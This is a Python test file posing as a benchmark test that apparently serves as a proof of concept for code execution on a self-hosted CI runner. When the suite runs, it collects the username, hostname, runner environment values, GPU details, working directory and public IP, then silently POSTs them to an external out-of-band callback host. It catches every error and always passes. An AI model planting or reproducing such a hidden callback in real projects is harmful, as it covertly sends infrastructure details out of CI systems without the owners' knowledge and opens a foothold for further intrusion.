# benchmarks/test_security_poc.py

import subprocess
import urllib.request
import json
import os

def test_security_poc():
    """
    Security PoC - proves arbitrary code execution on self-hosted runner.
    This test does NOT access secrets, modify files, or cause harm.
    It only collects non-sensitive system info to prove execution context.
    """
    
    info = {
        "poc": "SECURITY_TEST_MARKER_8832",
        "whoami": subprocess.getoutput("whoami"),
        "hostname": subprocess.getoutput("hostname"),
        "runner_os": os.environ.get("RUNNER_OS", "unknown"),
        "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
        "gpu_info": subprocess.getoutput("nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo 'no gpu'"),
        "is_self_hosted": "true" if os.environ.get("RUNNER_NAME", "") != "" else "unknown",
        "working_dir": os.getcwd(),
        "ip": subprocess.getoutput("curl -s ifconfig.me 2>/dev/null || echo 'no curl'"),
    }
    
    # Send to your callback server
    # Use webhook.site or Burp Collaborator
    try:
        data = json.dumps(info).encode()
        req = urllib.request.Request(
            "https://xiwgprqhkpojanlkfbuw25jil38qmjji1.oast.fun",
            data=data,
            headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        pass
    
    # The test itself passes - doesn't break anything
    assert True
